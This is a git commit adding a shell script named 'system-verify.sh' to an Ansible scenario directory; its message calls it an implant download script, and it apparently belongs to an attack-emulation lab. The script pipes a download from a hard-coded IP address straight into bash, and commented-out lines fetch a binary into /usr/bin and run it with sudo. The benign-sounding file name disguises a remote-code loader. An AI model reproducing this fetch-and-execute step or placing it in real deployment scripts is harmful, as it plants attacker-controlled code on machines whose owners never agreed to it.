6dffd97f9086029154952a6afa140bcd55d8b820
thorinaboenke <thorina-boenke@web.de>
2024-08-12 10:02:22 +0200

    add the implent download script

---
+++ ansible/run/scenario4/files/system-verify.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+#curl http://192.42.1.174:8000 -o /usr/bin/systemp
+#sudo chmod +x /usr/bin/systemp
+#sudo /usr/bin/systemp
+
+#somewhere here is the problem, the downloaded implant is not executable.
+
+curl http://192.42.1.174:8000 | bash
